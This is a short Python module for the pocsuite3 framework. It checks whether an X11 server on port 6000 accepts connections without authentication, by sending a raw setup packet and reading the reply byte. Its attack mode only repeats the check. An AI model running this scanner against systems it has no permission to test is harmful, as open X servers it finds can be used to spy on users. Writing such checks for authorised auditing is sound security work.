# -*- coding: utf-8 -*-
# author: seven
from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY
import socket


class X11POC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['seven']
    vulDate = 'Jul 12, 2020'
    createDate = 'Jul 12, 2020'
    name = 'x11 unauthorized'
    appName = 'x11'
    appVersion = 'v1.0.0'
    vulType = '未授权'
    protocol = 'x11'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 6000
        result = {}
        if check(host,port):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['extra'] = 'empyt pass'
        return self.parse_output(result)
    def _attack(self):
        return self._verify()

def check(host,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(20)
    try:
        s.connect((host,int(port)))
        payload = b'\x6c\x00\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        s.send(payload)
        result = s.recv(1)
        return result == b'\x01'
    except Exception as e:
        logger.info('{}:{}\t {}'.format(host,port,str(e)))
    return False


register_poc(X11POC)